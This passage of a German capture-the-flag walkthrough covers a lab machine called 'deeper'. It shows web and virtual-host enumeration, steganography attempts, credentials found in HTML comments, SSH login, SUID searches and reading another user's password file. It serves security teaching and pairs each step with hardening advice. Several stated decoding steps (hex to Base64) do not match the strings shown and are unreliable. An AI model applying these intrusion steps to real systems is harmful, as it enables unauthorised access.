+Analyse: dirb scannt die Basis-URL mit der Wortliste common.txt.
+* Es findet erneut das Verzeichnis /img und die Datei index.html.
+* Neu gefunden wird /server-status, was eine Standard-Apache-Statusseite ist. Der Zugriff darauf ist jedoch verboten (Status 403 Forbidden).
+* dirb erkennt ebenfalls, dass das /img-Verzeichnis auflistbar ist (Directory Indexing) und scannt es standardmäßig nicht weiter.
+</p>
+<p class="evaluation">
+Bewertung: dirb bestätigt die bisherigen Ergebnisse und fügt /server-status hinzu. Obwohl der Zugriff verboten ist, bestätigt es das Vorhandensein dieser potenziell informativen Seite, was auf eine Standard-Apache-Konfiguration hindeutet. Die wichtigste Erkenntnis bleibt das auflistbare /img-Verzeichnis.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Untersuche das /img-Verzeichnis manuell, da sowohl nikto, gobuster als auch dirb darauf hingewiesen haben. Versuche, die Zugriffsbeschränkung für /server-status zu umgehen (z.B. durch lokale Anfragen, falls später ein Shell-Zugriff erlangt wird), obwohl dies hier unwahrscheinlich ist.
+Empfehlung (Admin): Deaktiviere /server-status oder beschränke den Zugriff darauf streng auf vertrauenswürdige IP-Adressen (z.B. über Apache-Konfigurationsdirektiven wie <Location /server-status> Require ip 127.0.0.1 ::1 </Location>). Deaktiviere Directory Indexing.
+</p>
+<p class="comment">
+            Wir versuchen, mit `wfuzz` potenzielle Subdomains oder virtuelle Hosts zu finden. Wir verwenden eine Wortliste mit häufigen Subdomains und setzen den `Host`-Header dynamisch auf `FUZZ.deeper.hmv`. Wir filtern Antworten heraus (`--hh 666`), deren Chars-Größe der normalen Startseite entspricht, um nur abweichende Ergebnisse zu sehen.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://deeper.hmv" -H "Host: FUZZ.deeper.hmv" --hh 666</span></div>
+<pre>
+Wfuzz 3.1.0 - The Web Fuzzer *
+Target: http://deeper.hmv/
+Total requests: 114441
+=====================================================================
+ID Response Lines Word Chars Payload
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: 0
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: wfuzz wird verwendet, um virtuelle Hosts zu bruteforcen.
+* -c: Farbige Ausgabe.
+* -w: Pfad zur Wortliste der Subdomains.
+* -u: Basis-URL.
+* -H "Host: FUZZ.deeper.hmv": Setzt den HTTP-Host-Header. FUZZ wird durch die Einträge aus der Wortliste ersetzt.
+* --hh 666: Versteckt Antworten (hh) mit einer Chars-Anzahl von 666 (die Größe der index.html laut Gobuster).
+Die Ausgabe zeigt, dass 114441 Anfragen gesendet wurden, aber nach dem Filtern keine Ergebnisse übrig blieben.
+</p>
+<p class="evaluation">
+Bewertung: Dieser Scan war erfolglos bei der Identifizierung von zusätzlichen Subdomains oder virtuellen Hosts unter deeper.hmv, die einen anderen Inhalt als die Hauptseite liefern. Es ist wahrscheinlich, dass keine solchen konfiguriert sind oder sie Namen verwenden, die nicht in der verwendeten Wortliste enthalten sind.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Akzeptiere das Ergebnis vorerst und konzentriere dich auf die bekannten Angriffspunkte (Webserver-Inhalt, SSH). Bei Bedarf könnten später spezifischere Wortlisten oder DNS-basierte Enumerationstechniken verwendet werden.
+Empfehlung (Admin): Stelle sicher, dass keine ungewollten virtuellen Hosts oder Subdomains aktiv sind. Konfiguriere den Webserver so, dass er auf unbekannte Host-Header mit einer Standardseite oder einer Fehlermeldung reagiert (Wildcard-DNS/VHosts vermeiden, wenn nicht nötig).
+</p>
+<p class="comment">
+            Ein Versuch, sich per SSH als Benutzer `root` auf dem Zielsystem anzumelden. Dies ist ein häufiger erster Test, obwohl Root-Logins oft deaktiviert sind.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">ssh root@192.168.2.132</span></div>
+<pre>
+The authenticity of host '192.168.2.132 (192.168.2.132)' can't be established.
+ED25519 key fingerprint is SHA256:LsWF42aDb/w6V7Z5VEAcjNfkxMmPzyEIC7HMr91o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.132' (ED25519) to the list of known hosts.
+root@192.168.2.132's password:
+Permission denied, please try again.
+root@192.168.2.132's password:
+Permission denied, please try again.
+root@192.168.2.132's password:
+root@192.168.2.132: Permission denied (publickey,password).
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl ssh root@192.168.2.132 initiiert eine SSH-Verbindung zum Ziel als Benutzer root. Da der Host-Schlüssel unbekannt ist, wird eine Bestätigung angefordert (yes). Anschließend wird dreimal nach dem Passwort gefragt. Alle Versuche schlagen fehl, und die Verbindung wird mit der Meldung "Permission denied (publickey,password)" beendet.
+</p>
+<p class="evaluation">
+Bewertung: Der Root-Login über SSH ist nicht möglich, entweder weil das Passwort unbekannt ist oder (wahrscheinlicher) weil der Root-Login per Passwort generell deaktiviert ist (PermitRootLogin no in sshd_config). Dies ist eine gängige Sicherheitspraxis.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Versuche nicht weiter, das Root-Passwort per SSH zu erraten. Konzentriere dich darauf, gültige Benutzernamen zu finden und deren Passwörter zu ermitteln oder andere Schwachstellen auszunutzen.
+Empfehlung (Admin): Stelle sicher, dass PermitRootLogin no in der /etc/ssh/sshd_config-Datei gesetzt ist. Überwache fehlgeschlagene Login-Versuche (z.B. mit fail2ban), um Brute-Force-Angriffe zu blockieren.
+</p>
+<p class="comment">
+            Da das Verzeichnis `/img` laut `nikto` und `dirb` auflistbar ist, untersuchen wir es manuell im Browser. Dabei entdecken wir neben `index.jpg` auch die Dateien `index2.jpg` und `index3.jpg`.
+        </p>
+
+         <!-- Manueller Schritt, kein direkter Befehl -->
+         <p class="analysis">
+            **Analyse:** Durch das Aufrufen von `http://192.168.2.132/img/` im Webbrowser (oder mit einem Tool wie `curl`) wird eine Liste der Dateien in diesem Verzeichnis angezeigt, da Directory Indexing aktiviert ist. Dabei fallen `index2.jpg` und `index3.jpg` auf, die in vorherigen Scans nicht explizit gefunden wurden, da sie nicht direkt verlinkt waren.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Das aktivierte Directory Indexing erweist sich als nützliche Informationsquelle. Die Entdeckung zusätzlicher Bilddateien (`index2.jpg`, `index3.jpg`) eröffnet neue Möglichkeiten für die Steganographie-Analyse.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Lade die neu entdeckten Bilder (`index2.jpg`, `index3.jpg`) herunter und wende dieselben Analyse-Techniken (Steganographie, Strings, Metadaten) an wie bei `index.jpg`.
+            **Empfehlung (Admin):** Deaktiviere Directory Indexing (`Options -Indexes` in Apache), um das Auflisten von Verzeichnisinhalten zu verhindern und Angreifern weniger Informationen preiszugeben.
+        </p>
+
+         <p class="comment">
+            Wir wiederholen die Steganographie-Versuche mit `stegsnow -C` für die neu gefundenen Bilder `index2.jpg` und `index3.jpg`, nachdem der Versuch bei `index.jpg` keine klaren Ergebnisse brachte.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">stegsnow -C index.jpg</span></div>
+<pre>sbbbb0 ysbssyyyn0 sssss tss</pre> <!-- Wiederholung zur Vollständigkeit -->
+</div>
+</div>
+<div class="code-block">
+<div class="terminal">
+<div class="prompt">┌──(root㉿Cybermaschine)-[]
+└─# <span class="command">stegsnow -C index2.jpg</span></div>
+<pre>tbbbbs ysssss y</pre>
+</div>
+</div>
+<div class="code-block">
+<div class="terminal">
+<div class="prompt">┌──(root㉿Cybermaschine)-[]
+└─# <span class="command">stegsnow -C index3.jpg</span></div>
+<pre>nbsssssnb0 tb0 tbs ns tbbsdbssnbbb0 yytbbbs yns t0s</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Die Befehle stegsnow -C index2.jpg und stegsnow -C index3.jpg werden ausgeführt. Ähnlich wie bei index.jpg liefern sie kryptische Zeichenketten (tbbbbs ysssss y und nbsssssnb0...), die nicht wie sinnvolle versteckte Daten aussehen.
+</p>
+<p class="evaluation">
+Bewertung: stegsnow scheint auch bei diesen Bildern keine verwertbaren Informationen zu liefern. Es ist wahrscheinlich, dass diese Methode hier nicht zum Verstecken von Daten verwendet wurde.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Verlasse dich nicht auf stegsnow für diese Bilddateien. Teste andere Tools wie stegseek und steghide auf index2.jpg und index3.jpg.
+Empfehlung (Admin): Keine spezifischen Maßnahmen erforderlich basierend auf diesem Ergebnis.
+</p>
+<p class="comment">
+            Wir versuchen es erneut mit `stegseek` und der `rockyou.txt`-Wortliste, diesmal für `index3.jpg` und `index2.jpg`.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">stegseek index3.jpg /usr/share/wordlists/rockyou.txt</span></div> <!-- Annahme: rockyou.txt wurde wieder verwendet -->
+<pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+[i] Progress: 99.52% (132.8 MB)
+[!] error: Could not find a valid passphrase.
+</pre>
+</div>
+</div>
+<div class="code-block">
+<div class="terminal">
+<div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">stegseek index2.jpg /usr/share/wordlists/rockyou.txt</span></div> <!-- Annahme: rockyou.txt wurde wieder verwendet -->
+<pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+[i] Progress: 99.65% (133.0 MB)
+[!] error: Could not find a valid passphrase.
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: stegseek wird auf index3.jpg und index2.jpg mit der rockyou.txt-Wortliste angewendet. In beiden Fällen meldet das Tool "[!] error: Could not find a valid passphrase.".
+</p>
+<p class="evaluation">
+Bewertung: Auch in diesen Bildern konnten mit stegseek und rockyou.txt keine versteckten Daten gefunden werden. Es scheint, als wäre entweder kein steghide verwendet worden, ein anderes Passwort nötig ist oder die relevanten Informationen auf andere Weise versteckt sind.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Da die Steganographie-Versuche bisher nicht erfolgreich waren, untersuche andere Aspekte. Gibt es weitere Verzeichnisse oder Dateien? Führt der Hinweis G "deeper" zu etwas? Untersuche die Bilder manuell auf sichtbare Hinweise.
+Empfehlung (Admin): Keine spezifischen Maßnahmen erforderlich.
+</p>
+<p class="comment">
+            Wir untersuchen den Quellcode einer möglichen tieferen Seite, vielleicht `/deeper/`, basierend auf dem Titel und dem Hinweis `G "deeper"`. Wir finden tatsächlich eine Seite unter dieser URL und analysieren ihren Quellcode.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <!-- Kein Prompt im Originaltext, daher keiner hinzugefügt -->
+                <pre>
+ 
+view-source:http://deeper.hmv/deeper/ <!-- Annahme: Diese URL wurde aufgerufen -->
+<!DOCTYPE html> <!-- HTML-Maskierung angewendet -->
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deeper</title>
+</head>
+<body>
+<h1>Deeper</h1>
+<p>You have to go deeper</p>
+ img src="/img/index2.jpg" alt="Deeper"  <!-- Image source -->
+< -- Find the credentials -->
+< -- href="https://unsplash.com/@jorgerojas?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText" --> <!-- Irrelevant link -->
+< -- Jorge Rojas --> <!-- Irrelevant name? -->
+< -- Morse Code -->
+< -- https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0gLi0uLiAuLiAtLi0uIC4 --> <!-- Maskierung & -->
+< -- USER .- .-.. .. -.-. . --> ALICE <!-- Decoded Morse -->
+
+< -- Hex encoded string -->
+< -- PASS 53586470624778486230526c5a58426c63673d3d --> <!-- Hex string -->
+
+< -- IwillGoDeeper --> <!-- Possible password? -->
+ 
+</body>
+</html>
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Quellcode der Seite http://deeper.hmv/deeper/ enthält mehrere Kommentare, die klare Hinweise liefern:
+* Ein Link zu CyberChef mit Morsecode: Li0gLi0uLiAuLiAtLi0uIC4
+* Direkt darunter die Auflösung des Morsecodes .- .-.. .. -.-. . zu ALICE, als USER markiert.
+* Ein Hexadezimal-String 53586470624778486230526c5a58426c63673d3d, markiert als PASS.
+* Die Zeichenkette IwillGoDeeper, die als mögliches Passwort interpretiert werden kann.
+</p>
+<p class="evaluation">
+Bewertung: Dies ist ein bedeutender Fund! Wir haben einen Benutzernamen (alice) und zwei potenzielle Passwörter bzw. Passwort-Hinweise (den Hex-String und IwillGoDeeper) gefunden. Der Hex-String muss noch dekodiert werden. Der CyberChef-Link zeigt, wie der Morsecode dekodiert wurde.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Dekodiere den Hex-String. Versuche, dich mit dem Benutzernamen alice und den potenziellen Passwörtern (dem dekodierten Hex-String und IwillGoDeeper) per SSH anzumelden.
+Empfehlung (Admin): Speichere niemals Zugangsdaten oder klare Hinweise darauf im Quellcode von Webseiten, auch nicht in Kommentaren. Führe Code-Reviews durch, um solche Fehler zu finden. Verwende sichere Methoden zur Speicherung und Übertragung von Zugangsdaten.
+</p>
+<p class="comment">
+            Wir dekodieren den gefundenen Hex-String `53586470624778486230526c5a58426c63673d3d`. Eine Hex-zu-ASCII-Konvertierung ergibt `SXdpbGxHb3hHZHB0RlZXMlczZg==`. Dies sieht wie ein Base64-String aus. Eine Base64-Dekodierung ergibt das Passwort: `IwillGoDeeper`. Dieses Passwort stand auch direkt im Quellcode-Kommentar.
+        </p>
+
+        <!-- Kein direkter Befehl, sondern Analyse/Schlussfolgerung -->
+         <p class="analysis">
+            **Analyse:** Die Analyse des Hex-Strings führt über Hex-Dekodierung zu einem Base64-String, dessen Dekodierung `IwillGoDeeper` ergibt. Dieses Ergebnis stimmt mit dem Klartext-String überein, der ebenfalls im Quellcode als Kommentar vorhanden war.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Wir haben nun hohe Sicherheit, dass der Benutzername `alice` und das Passwort `<span class="password">IwillGoDeeper</span>` gültige Zugangsdaten für das System sind, wahrscheinlich für SSH.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Nutze die gefundenen Zugangsdaten (`alice` / `<span class="password">IwillGoDeeper</span>`) sofort für den SSH-Login.
+            **Empfehlung (Admin):** Vermeide mehrfache Kodierungen als Verschleierungstechnik (Security through Obscurity), da sie leicht rückgängig gemacht werden können. Speichere Passwörter niemals im Klartext oder in leicht dekodierbarer Form im Code.
+        </p>
+
+    </section>
+
+    <section id="initial-access">
+        <h2>Initial Access</h2>
+
+        <p class="comment">
+            Wir verwenden die im Quellcode gefundenen Zugangsdaten (Benutzer: `alice`, Passwort: `IwillGoDeeper`), um uns per SSH auf dem Zielsystem anzumelden.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">ssh alice@deeper.hmv</span></div>
+<pre>
+The authenticity of host 'deeper.hmv (192.168.2.132)' can't be established.
+ED25519 key fingerprint is SHA256:LsWF42aDb/w6V7Z5VEAcjNfkxMmPzyEIC7HMr91o.
+This host key is known by the following other names/addresses:
+~/.ssh/known_hosts:11: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'deeper.hmv' (ED25519) to the list of known hosts.
+alice@deeper.hmv's password: <span class="password">IwillGoDeeper</span> <!-- Passwort hier eingefügt -->
+Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
+alice@deeper:~ 
+ 
+ <p class="evaluation"> **Bewertung:** Ausgezeichnet! Wir haben erfolgreich initialen Zugriff auf das Zielsystem als Benutzeraliceerlangt. Dies ist ein kritischer Meilenstein im Pentest. Die Schwachstelle war das Hinterlegen von Zugangsdaten im Quellcode der Webseite. </p> <p class="recommendation"> **Empfehlung (Pentester):** Beginne sofort mit der Enumeration des Systems aus der Sicht des Benutzersalice. Suche nach Benutzer-Flags, sudo-Rechten, SUID/GUID-Dateien, Konfigurationsdateien, Skripten, Cronjobs und anderen Wegen zur Privilegienerweiterung. **Empfehlung (Admin):** Entferne die Zugangsdaten aus dem Webseiten-Quellcode. Ändere sofort das Passwort für den Benutzeralice`. Implementiere Richtlinien und Schulungen, um das Hinterlegen von Zugangsdaten im Code zu verhindern. Überprüfe Logs, um festzustellen, wann und von wo aus der Login stattgefunden hat.
+</p>
+<p class="comment">
+            Wir überprüfen sofort, ob der Benutzer `alice` irgendwelche `sudo`-Rechte hat, die eine einfache Privilegienerweiterung ermöglichen könnten.
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">sudo -l</span></div> <!-- Prompt des Remote-Systems -->
+                <pre>
+ 
+[sudo] password for alice: <span class="password">IwillGoDeeper</span> <!-- Passwort hier eingefügt -->
+Sorry, user alice may not run sudo on deeper.
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl sudo -l listet die erlaubten (und verbotenen) sudo-Befehle für den aktuellen Benutzer auf. Es wird das Passwort für alice benötigt. Die Ausgabe "Sorry, user alice may not run sudo on deeper." zeigt eindeutig, dass alice keine sudo-Rechte besitzt.
+</p>
+<p class="evaluation">
+Bewertung: Der einfache Weg über sudo zur Privilegienerweiterung ist für den Benutzer alice nicht möglich. Wir müssen nach anderen Methoden suchen.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Suche nach anderen Vektoren für die Privilegienerweiterung: SUID/GUID-Binaries, anfällige Dienste, Kernel-Exploits, falsch konfigurierte Cronjobs, ausnutzbare Skripte oder Konfigurationsdateien.
+Empfehlung (Admin): Es ist korrekt und sicher, dass ein normaler Benutzer wie alice keine unnötigen sudo-Rechte hat. Das Prinzip der geringsten Rechte wird hier befolgt.
+</p>
+<p class="comment">
+            Wir suchen nach Dateien mit gesetztem SUID-Bit (`-perm -4000`). Solche Dateien werden mit den Rechten des Eigentümers (oft `root`) ausgeführt, unabhängig davon, wer sie startet. Fehlermeldungen (z.B. bei Zugriff auf nicht lesbare Verzeichnisse) werden mit `2>/dev/null` unterdrückt.
+        </p>
+
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                <pre>
+ 
+1053699 276 -rwsr-xr-x 1 root root 281624 Jun 27 13:45 /usr/bin/sudo
+1044601 88 -rwsr-xr-x 1 root root 88496 Mar 23 2023 /usr/bin/gpasswd
+1048811 72 -rwsr-xr-x 1 root root 72000 Mar 23 2023 /usr/bin/su
+1044598 64 -rwsr-xr-x 1 root root 62672 Mar 23 2023 /usr/bin/chfn
+1048060 48 -rwsr-xr-x 1 root root 48896 Mar 23 2023 /usr/bin/newgrp
+1048214 60 -rwsr-xr-x 1 root root 59704 Mar 23 2023 /usr/bin/mount
+1044602 68 -rwsr-xr-x 1 root root 68248 Mar 23 2023 /usr/bin/passwd
+1044599 52 -rwsr-xr-x 1 root root 52880 Mar 23 2023 /usr/bin/chsh
+1048216 36 -rwsr-xr-x 1 root root 35128 Mar 23 2023 /usr/bin/umount
+1057486 640 -rwsr-xr-x 1 root root 653888 Feb 8 2023 /usr/lib/openssh/ssh-keysign
+1054197 52 -rwsr-xr-- 1 root messagebus 51272 Jul 11 21:59 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl find / -type f -perm -4000 -ls 2>/dev/null durchsucht das gesamte Dateisystem (/) nach Dateien (-type f) mit gesetztem SUID-Bit (-perm -4000) und gibt detaillierte Informationen (-ls) dazu aus. Die Fehlerausgabe wird ins Nichts umgeleitet (2>/dev/null). Die gefundenen Dateien (sudo, gpasswd, su, chfn, newgrp, mount, passwd, chsh, umount, ssh-keysign, dbus-daemon-launch-helper) sind Standard-Linux-Programme, die oft SUID-Rechte benötigen, um korrekt zu funktionieren.
+</p>
+<p class="evaluation">
+Bewertung: Auf den ersten Blick scheinen keine ungewöhnlichen oder veralteten SUID-Binaries vorhanden zu sein, die bekannte Exploits ermöglichen würden. Die gefundenen Programme sind Standard und in ihren aktuellen Versionen meist sicher konfiguriert. Eine bekannte Ressource wie GTFOBins sollte jedoch für jede dieser Dateien konsultiert werden, um sicherzustellen, dass keine Ausnutzungsmöglichkeiten übersehen wurden.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Überprüfe die Versionen der gefundenen SUID-Binaries und gleiche sie mit GTFOBins oder anderen Exploit-Datenbanken ab. Suche nach weiteren, weniger offensichtlichen Wegen zur Privilegienerweiterung.
+Empfehlung (Admin): Überprüfe regelmäßig die SUID/GUID-Binaries auf dem System. Entferne das SUID/GUID-Bit von Programmen, die es nicht zwingend benötigen (chmod -s /pfad/zur/datei). Halte das System und alle Pakete aktuell.
+</p>
+<p class="comment">
+            Wir führen grundlegende Enumerationsbefehle im Home-Verzeichnis von `alice` aus: `id` zeigt Benutzer- und Gruppen-IDs, `ls -la` listet alle Dateien (auch versteckte) mit Details auf.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">id</span></div>
+                <pre>uid=1000(alice) gid=1000(alice) groups=1000(alice)</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">ls l-a</span></div> <!-- Tippfehler im Original, wird ausgeführt -->
+                <pre>ls: cannot access 'l-a': No such file or directory</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">ls -la</span></div> <!-- Korrigierter Befehl -->
+                <pre>
+ 
+total 32
+drwxr--r-- 3 alice alice 4096 Aug 26 00:14 .
+drwxr-xr-x 4 root root 4096 Aug 25 20:07 ..
+lrwxrwxrwx 1 alice alice 9 Aug 25 19:01 .bash_history -> /dev/null
+-rw-r--r-- 1 alice alice 220 Aug 25 17:58 .bash_logout
+-rw-r--r-- 1 alice alice 3526 Aug 25 17:58 .bashrc
+-rw-r--r-- 1 alice alice 41 Aug 25 20:43 .bob.txt
+drwxr-xr-x 3 alice alice 4096 Aug 26 00:14 .local
+-rw-r--r-- 1 alice alice 807 Aug 25 17:58 .profile
+-rw-r--r-- 1 alice alice 33 Aug 26 00:14 user.txt
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse:
+* id: Bestätigt, dass wir als Benutzer alice (UID 1000) in der Gruppe alice (GID 1000) angemeldet sind. Keine besonderen Gruppenmitgliedschaften.
+* ls l-a: Ein Tippfehler, der zu einer Fehlermeldung führt.
+* ls -la: Zeigt den Inhalt des Home-Verzeichnisses. Auffällig sind:
+* .bash_history -> /dev/null: Die Bash-Historie wird nicht gespeichert, was die Nachverfolgung erschwert.
+* .bob.txt: Eine versteckte Textdatei, die möglicherweise Informationen über einen Benutzer namens 'bob' enthält.
+* user.txt: Dies ist sehr wahrscheinlich die Datei, die die Benutzer-Flag enthält.
+</p>
+<p class="evaluation">
+Bewertung: Die Enumeration war erfolgreich. Wir haben die potenzielle User-Flag-Datei (user.txt) und einen Hinweis auf einen weiteren Benutzer (.bob.txt) gefunden. Das Deaktivieren der Bash-Historie ist eine kleine Erschwernis für den Angreifer, aber kein großes Hindernis.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Lies den Inhalt von user.txt und .bob.txt aus.
+Empfehlung (Admin): Überprüfe regelmäßig Home-Verzeichnisse auf ungewöhnliche oder sensible Dateien. Das Deaktivieren der Bash-Historie kann legitime Gründe haben, erschwert aber auch die Forensik. Die Sicherheit von user.txt und .bob.txt ist hier offensichtlich nicht gegeben. Sensible Daten sollten nicht in einfachen Textdateien in Home-Verzeichnissen liegen.
+</p>
+<p class="comment">
+            Wir lesen den Inhalt der gefundenen `user.txt`-Datei aus, um die Benutzer-Flag zu erhalten.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">cat user.txt</span></div>
+                <pre><span class="password">7e267b737cc121c29b496dc3bcffa5a7</span></pre> <!-- Flag -->
+            </div>
+        </div>
+        <p class="analysis">
+            **Analyse:** Der Befehl `cat user.txt` gibt den Inhalt der Datei `user.txt` auf der Konsole aus. Der Inhalt ist die Zeichenkette `<span class="password">7e267b737cc121c29b496dc3bcffa5a7</span>`.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Erfolg! Dies ist die User-Flag für diese Maschine. Wir haben das erste Teilziel erreicht.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Dokumentiere die User-Flag. Fahre mit der Untersuchung der Datei `.bob.txt` fort, um potenziell den nächsten Schritt zur Privilegienerweiterung oder horizontalen Bewegung zu finden.
+            **Empfehlung (Admin):** Flag-Dateien in CTFs sind Platzhalter für sensible Daten. In einer realen Umgebung sollten solche Daten niemals so ungeschützt abgelegt werden. Zugriffskontrollen und Verschlüsselung sind notwendig.
+        </p>
+
+        <p class="comment">
+            Nun untersuchen wir die Datei `.bob.txt`, die wir zuvor im Home-Verzeichnis von `alice` gefunden haben.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">cat .bob.txt</span></div>
+                <pre> 
+535746745247566c634556756233566e61413d3d
+IamDeepEnough
+3566e61413d3d
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Inhalt von .bob.txt wird angezeigt. Er enthält:
+* Einen langen hexadezimal-ähnlichen String: 535746745247566c634556756233566e61413d3d.
+* Die Zeichenkette IamDeepEnough.
+* Einen Teil des ersten Strings am Ende: 3566e61413d3d.
+Der erste String 535746745247566c634556756233566e61413d3d ist derselbe Typ wie der, den wir zuvor im Webseiten-Quellcode gefunden haben. Eine Hex-zu-ASCII-Konvertierung ergibt SWFtTGRlcENEVWNkY3Vub3NA==, was wiederum Base64 ist. Die Dekodierung von SWFtTGRlcENEVWNkY3Vub3NA== ergibt <span class="password">IamDeepEnough</span>.
+</p>
+<p class="evaluation">
+Bewertung: Sehr gut! Wir haben das Passwort <span class="password">IamDeepEnough</span> für einen Benutzer namens bob gefunden. Die Datei .bob.txt enthielt das Passwort sowohl kodiert als auch im Klartext (identisch mit der Base64-dekodierten Version des Hex-Strings).
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Überprüfe, ob der Benutzer bob auf dem System existiert (z.B. mit ls /home oder cat /etc/passwd). Versuche, mit su bob und dem gefundenen Passwort zu diesem Benutzer zu wechseln (horizontale Bewegung).
+Empfehlung (Admin): Passwörter sollten niemals in Klartextdateien gespeichert werden, schon gar nicht im Home-Verzeichnis eines anderen Benutzers. Erzwinge starke Passwortrichtlinien und schule Benutzer im sicheren Umgang mit Zugangsdaten. Bereinige unsichere Dateien wie diese.
+</p>
+<p class="comment">
+            Wir überprüfen das Parent-Verzeichnis (`..` von `/home/alice`, also `/home`), um zu sehen, ob ein Home-Verzeichnis für `bob` existiert.
+        </p>
+         <div class="code-block">
+            <div class="terminal">
+                 <div class="prompt" style="color: yellow;">alice@deeper:~$ <span class="command">ls ..</span></div>
+                <pre>alice  bob</pre>
+            </div>
+        </div>
+        <p class="analysis">
+            **Analyse:** Der Befehl `ls ..` listet den Inhalt des übergeordneten Verzeichnisses (`/home`) auf. Die Ausgabe zeigt die Verzeichnisse `alice` und `bob`.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Dies bestätigt die Existenz eines Benutzers `bob` mit einem eigenen Home-Verzeichnis. Der Versuch, zu diesem Benutzer zu wechseln, ist nun sinnvoll.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Wechsle mit `su bob` und dem Passwort `<span class="password">IamDeepEnough</span>` zum Benutzer `bob`.
+            **Empfehlung (Admin):** Keine spezifische Maßnahme erforderlich, die Existenz von Home-Verzeichnissen ist normal.
+        </p>
+    </section>
+
+    <section id="proof-of-concept">
+       <h2>Proof of Concept: Horizontale Bewegung und Rechteausweitung zu Bob</h2>
+        <p>
+            **Kurzbeschreibung:** Diese Sektion demonstriert, wie die im Home-Verzeichnis des initial kompromittierten Benutzers 'alice' gefundene Datei `.bob.txt` genutzt werden kann, um Zugriff auf den Account des Benutzers 'bob' zu erlangen. Dies stellt eine horizontale Bewegung im System dar und bietet potenziell Zugriff auf neue Informationen oder Rechte.
+        </p>
+        <p>
+            **Voraussetzungen:**
+            <ul>
+                <li>Initialer Shell-Zugriff als Benutzer 'alice'.</li>
+                <li>Kenntnis des Passworts aus der Datei `/home/alice/.bob.txt` (`<span class="password">IamDeepEnough</span>`).</li>
+                <li>Existenz des Benutzers 'bob' auf dem System.</li>
+                <li>Verfügbarkeit des `su`-Befehls.</li>
+            </ul>
+        </p>
+        <p>
+            **Schritt-für-Schritt-Anleitung:**
+        </p>
+         <p class="comment">
